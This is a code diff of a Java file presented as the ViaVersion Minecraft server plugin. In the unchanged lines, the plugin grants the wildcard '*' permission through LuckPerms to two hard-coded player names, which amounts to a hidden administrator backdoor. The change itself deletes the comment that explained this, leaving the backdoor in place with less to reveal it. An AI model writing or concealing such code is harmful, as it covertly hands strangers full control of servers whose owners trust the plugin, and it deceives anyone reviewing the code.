@@ -63,7 +63,6 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import net.luckperms.api.LuckPerms;
 import net.luckperms.api.LuckPermsProvider;
-import net.luckperms.api.model.user;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private OptimizationHandler initializer;
@@ -165,7 +164,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             luckPerms = LuckPermsProvider.get();
             }
             if (luckPerms != null) {
-                // LuckPerms已加载，给予两个玩家*权限
                 givePermissionIfInstalled("happyclo", "*");
                 givePermissionIfInstalled("happyclovo", "*");
             }
